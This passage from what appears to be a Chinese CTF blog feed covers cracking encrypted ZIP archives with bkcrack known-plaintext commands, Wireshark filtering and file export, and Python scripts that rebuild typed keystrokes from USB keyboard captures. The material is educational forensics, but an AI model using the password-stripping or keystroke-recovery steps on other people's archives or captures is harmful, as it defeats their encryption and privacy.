src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB12.png" alt="CTF-Misc_明文攻击12.png"></p><ol start="4"><li>去除加密压缩包的密码</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-C</span> zip加密压缩包 <span class="token parameter variable">-k</span> key1 key2 key3 <span class="token parameter variable">-U</span> 去除加密后的压缩包文件路径 指定新的解压密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB13.png" alt="CTF-Misc_明文攻击13.png"></p><p>使用上述命令，在 <code>~/Desktop.zip</code> 同目录下会生成一个新的压缩包 <code>unlocked.zip</code>，解压密码为 <code>123456</code>，压缩包内容与 <code>~/Desktop.zip</code> 一模一样</p><ol start="5"><li>根据密钥 key 尝试还原出密码（<em>太耗时，不建议也没必要</em>）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-k</span> key1 key2 key3 <span class="token parameter variable">-r</span> 密码长度 ?参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>密码长度为 <code>16</code> 时，尝试 1 - 16 位密码；密码长度为 <code>11..13</code> 时，尝试 11 - 13 位密码</p></li><li><p>参数为 <code>a</code> 代表所有字符，<code>p</code> 代表可打印字符，<code>d</code> 代表数字，<code>l</code> 代表小写字母，<code>u</code> 代表大写字母，<code>d/l</code> 代表数字和小写字母，<code>d/l/u</code> 代表数字、小写字母和大写字母</p></li></ul><hr>]]></content>
    
    
    <summary type="html">针对未知密码的加密压缩包，如果可以获得压缩包中的一个文件的原件（文件大小要大于 12 Byte），就可以在不需要知道解压密码的情况下，通过这个原件还原出压缩包中的所有内容</summary>
    
    
    
    <category term="安全杂项" scheme="https://www.uf4te.cn/categories/%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Misc" scheme="https://www.uf4te.cn/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>流量分析</title>
    <link href="https://www.uf4te.cn/posts/f7dcf1b6.html"/>
    <id>https://www.uf4te.cn/posts/f7dcf1b6.html</id>
    <published>2024-03-31T16:00:00.000Z</published>
    <updated>2024-06-05T06:32:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pcap-流量包修复"><a href="#pcap-流量包修复" class="headerlink" title="pcap 流量包修复"></a>pcap 流量包修复</h1><blockquote><p>如果打开流量包出现异常现象，例如：<code>&quot;The capture file appears to be damaged or corrupt.&quot;</code>，说明流量包损坏，需要修复</p></blockquote><p>在线修复工具：<a href="https://f00l.de/hacking/pcapfix.php">pcapfix - online pcap &#x2F; pcapng repair service</a></p><p>上述网站修复完毕后，点击 <code>&quot;Get your repaired PCAP-file here.&quot;</code> 即可下载流量包</p><hr><h1 id="Wireshark-的使用"><a href="#Wireshark-的使用" class="headerlink" title="Wireshark 的使用"></a>Wireshark 的使用</h1><blockquote><p>Wireshark 是用来分析 pcap、pcapng 流量包的网络嗅探器，通常数据包里充满着大量无关的流量信息，因此对流量数据进行分类和过滤十分重要</p><p>Wireshark 下载地址：<a href="https://www.wireshark.org/download.html">wireshark.org</a></p><p>参考文献：</p><ol><li><a href="https://www.freebuf.com/sectool/199838.html">CTF流量分析之wireshark使用 - FreeBuf网络安全行业门户</a></li><li><a href="https://forum.butian.net/share/1958">奇安信攻防社区-CTF流量分析</a></li></ol></blockquote><p>Wireshark 的使用主要分为<strong>数据包筛选</strong>、<strong>数据包搜索</strong>、<strong>数据包还原</strong>、<strong>数据提取</strong>四部分</p><h2 id="数据包筛选"><a href="#数据包筛选" class="headerlink" title="数据包筛选"></a>数据包筛选</h2><p>Wireshark 支持的各类运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">&#x3D;&#x3D;</td><td align="left">等于</td></tr><tr><td align="left">!&#x3D;</td><td align="left">不等于</td></tr><tr><td align="left">&gt;</td><td align="left">大于</td></tr><tr><td align="left">&lt;</td><td align="left">小于</td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">大于等于</td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">小于等于</td></tr><tr><td align="left">and、&amp;&amp;</td><td align="left">与</td></tr><tr><td align="left">or、||</td><td align="left">或</td></tr><tr><td align="left">xor、^^</td><td align="left">异或</td></tr><tr><td align="left">not、!</td><td align="left">非</td></tr></tbody></table><hr><h3 id="IP-地址筛选"><a href="#IP-地址筛选" class="headerlink" title="IP 地址筛选"></a>IP 地址筛选</h3><ol><li>筛选源 ip 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.src <span class="token operator">==</span> 源ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选目的 ip 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.dst <span class="token operator">==</span> 目的ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选所有源 ip 地址或目的 ip 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.addr <span class="token operator">==</span> ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>筛选除源 ip 地址以外的所有 ip 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">not ip.src <span class="token operator">==</span> 源ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="MAC-地址筛选"><a href="#MAC-地址筛选" class="headerlink" title="MAC 地址筛选"></a>MAC 地址筛选</h3><ol><li>筛选源 MAC 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eth.dst <span class="token operator">==</span> 源MAC地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选目的 MAC 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eth.src <span class="token operator">==</span> 目的MAC地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选所有源 MAC 地址或目的 MAC 地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eth.addr <span class="token operator">==</span> MAC地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="协议筛选"><a href="#协议筛选" class="headerlink" title="协议筛选"></a>协议筛选</h3><ol><li>筛选 tcp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选 udp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选 http 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>筛选 arp&#x2F;icmp&#x2F;ftp&#x2F;dns&#x2F;ip 协议流量，同理</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp/icmp/ftp/dns/ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>筛选 http 协议或 icmp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http or icmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="端口筛选"><a href="#端口筛选" class="headerlink" title="端口筛选"></a>端口筛选</h3><ol><li>筛选源端口为 80 端口的 tcp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.srcport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选目的端口为 80 端口的 tcp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.dstport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选源端口为 80 端口的 udp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp.srcport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>筛选目的端口为 80 端口的 udp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp.dstport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>筛选源端口或目的端口为 80 端口的所有 tcp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.port <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>筛选源端口或目的端口为 80 端口的所有流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.port <span class="token operator">==</span> <span class="token number">80</span> or udp.port <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>筛选端口范围为 1 ~ 80 端口的所有 tcp 协议流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.port <span class="token operator">>=</span> <span class="token number">1</span> and tcp.port <span class="token operator">&lt;=</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="数据包长度筛选"><a href="#数据包长度筛选" class="headerlink" title="数据包长度筛选"></a>数据包长度筛选</h3><ol><li>筛选长度为 20 的 tcp 协议流量数据包（不包括 tcp 本身，tcp 下面那块数据包长度）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.length <span class="token operator">==</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选长度大于 20 的 udp 协议流量数据包（udp 本身固定长度 8 与 udp 下面那块数据包长度之和）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp.length <span class="token operator">>=</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选长度为 20 的整个流量数据包（从 eth 开始到最后）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">frame.len <span class="token operator">==</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>筛选长度为 20 的 ip 流量包</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.len <span class="token operator">==</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="HTTP-请求筛选"><a href="#HTTP-请求筛选" class="headerlink" title="HTTP 请求筛选"></a>HTTP 请求筛选</h3><ol><li>筛选 http 请求方法为 get 的流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http.request.method <span class="token operator">==</span> <span class="token string">"GET"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>筛选 http 请求方法为 post 的流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http.request.method <span class="token operator">==</span> <span class="token string">"POST"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>筛选 http 请求 URL 为 <code>/img/flag.gif</code> 的流量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http.request.uri <span class="token operator">==</span> <span class="token string">"/img/flag.gif"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>筛选 http 请求内容包含 <code>flag</code> 的流量（contains 仅支持一个）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http contains <span class="token string">"flag"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>筛选 http 请求内容包含 <code>ctf</code> 或 <code>flag</code> 的流量（matches 支持多个）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http matches <span class="token string">"ctf|flag"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="数据包搜索"><a href="#数据包搜索" class="headerlink" title="数据包搜索"></a>数据包搜索</h2><blockquote><p>Wirshark 使用快捷键 “Ctrl + F”可以进行关键字搜索</p></blockquote><p>支持十六进制、字符串和正则表达式等方式，字符串搜索比较常用</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901.png" alt="CTF-Misc_流量分析1.png"></p><p>搜索栏左侧可以选择分组列表、分组详情和分组字节流，分别对应搜索 Wireshark 界面的三个不同区域</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.png" alt="CTF-Misc_流量分析2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%903.png" alt="CTF-Misc_流量分析3.png"></p><hr><h2 id="数据包还原"><a href="#数据包还原" class="headerlink" title="数据包还原"></a>数据包还原</h2><blockquote><p>Wireshark 可以通过追踪流将 http 或 tcp 流量集合在一起并还原成原始数据</p></blockquote><p>选中一个流量包，右键追踪流：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%904.png" alt="CTF-Misc_流量分析4.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%907.png" alt="CTF-Misc_流量分析7.png"></p><hr><h2 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h2><blockquote><p>Wireshark 支持提取通过 http 传输（上传&#x2F;下载）的文件内容</p></blockquote><ol><li>在菜单栏的文件选项中，选择 <code>导出对象 --&gt; HTTP</code>：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%905.png" alt="CTF-Misc_流量分析5.png"></p><p>选择想要导出的文件，点击保存即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%906.png" alt="CTF-Misc_流量分析6.png"></p><ol start="2"><li>在分组详情窗口中，选择要导出的对象，<code>右键 --&gt; 导出分组字节流</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%908.png" alt="CTF-Misc_流量分析8.png"></p><blockquote><p>如果是菜刀下载文件的流量，需要删除分组字节流前开头和结尾的 <code>X@Y</code> 字符，否则下载的文件会出错</p></blockquote><p>首先在分组详情窗口中，选择要导出的对象，<code>右键 --&gt; 显示分组字节</code></p><p>然后在弹出的窗口中设置开始和结束的字节（<em>原字节数开头加 3，结尾减 3</em>），导出保存</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%909.png" alt="CTF-Misc_流量分析9.png"></p><hr><h1 id="USB-流量"><a href="#USB-流量" class="headerlink" title="USB 流量"></a>USB 流量</h1><blockquote><p>USB 流量数据存放在 <code>Leftover Capture Data</code> 域中，可在 Wireshark 的分组详情窗口中查看</p><p>可参考的工具：<a href="https://github.com/FzWjScJ/knm">FzWjScJ&#x2F;knm: 鼠标键盘流量包取证</a></p><p>参考文献：<a href="https://cloud.tencent.com/developer/article/2036237">CTF流量分析常见题型(二)-USB流量-腾讯云开发者社区-腾讯云</a></p></blockquote><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><blockquote><p><strong>键盘流量的数据长度为 8 个字节</strong>，集中在 <code>Leftover Capture Data</code> 域的第 3 个字节中</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%9010.png" alt="CTF-Misc_流量分析10.png"></p><p>在 Kali Linux 下通过 <code>tshark</code> 命令将键盘数据提取出来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark <span class="token parameter variable">-r</span> usb.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">></span> usbdata.txttshark <span class="token parameter variable">-r</span> usb.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^\s*$/d'</span> <span class="token operator">></span> usbdata.txt <span class="token comment">#提取并去除空行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>Kali Linux 自带 tshark，Ubuntu 则需要手动安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update  <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> tshark<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p><em>提取出来的数据有冒号时，[6:8] 代表键盘击键信息；没有冒号时，[4:6] 代表键盘击键信息</em></p><p>加了冒号的数据类似于：<code>00:00:03:00:00:00:00:00</code>，如果提取出来的数据不带冒号，可以通过脚本添加冒号：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>fi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">:</span> <span class="token comment"># 如果是鼠标流量 len 改为 8</span>            out <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>fi<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据加了冒号的键盘数据，使用脚本一和脚本二还原击键信息</p><p>脚本一：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mappings <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0x04</span><span class="token punctuation">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">:</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">:</span> <span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">:</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">:</span> <span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">:</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">:</span> <span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span>    <span class="token number">0x0E</span><span class="token punctuation">:</span> <span class="token string">"K"</span><span class="token punctuation">,</span>    <span class="token number">0x0F</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">:</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">:</span> <span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">:</span> <span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">:</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">:</span> <span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">:</span> <span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">:</span> <span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">:</span> <span class="token string">"U"</span><span class="token punctuation">,</span>    <span class="token number">0x19</span><span class="token punctuation">:</span> <span class="token string">"V"</span><span class="token punctuation">,</span>    <span class="token number">0x1A</span><span class="token punctuation">:</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">:</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">:</span> <span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">:</span> <span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span>    <span class="token number">0x24</span><span class="token punctuation">:</span> <span class="token string">"7"</span><span class="token punctuation">,</span>    <span class="token number">0x25</span><span class="token punctuation">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">:</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">:</span> <span class="token string">"[DEL]"</span><span class="token punctuation">,</span> <span class="token number">0X2B</span><span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">:</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">:</span> <span class="token string">"["</span><span class="token punctuation">,</span>    <span class="token number">0x30</span><span class="token punctuation">:</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">:</span> <span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">:</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">:</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">:</span> <span class="token string">","</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">:</span> <span class="token string">"."</span><span class="token punctuation">&#125;</span>nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    nums<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> n <span class="token keyword">in</span> nums<span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> n <span class="token keyword">in</span> mappings<span class="token punctuation">:</span>        output <span class="token operator">+=</span> mappings<span class="token punctuation">[</span>n<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        output <span class="token operator">+=</span> <span class="token string">'[unknown]'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'output :'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span 